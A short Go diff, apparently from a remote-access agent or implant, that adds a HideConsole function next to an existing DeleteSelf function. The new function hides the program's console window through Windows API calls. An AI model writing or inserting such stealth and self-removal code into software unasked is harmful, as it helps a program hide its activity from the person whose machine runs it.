@@ -701,3 +701,16 @@ func DeleteSelf() ([]byte, error) {
 	return []byte("success delete"), nil
 
 }
+
+func HideConsole() ([]byte, error) {
+	if getConsoleWindow.Find() == nil && showWindow.Find() == nil {
+		hwnd, _, _ := getConsoleWindow.Call()
+		if hwnd != 0 {
+			_, _, err := showWindow.Call(hwnd, windows.SW_HIDE)
+			if err != nil {
+				return nil, err
+			}
+		}
+	}
+	return []byte("hide success"), nil
+}
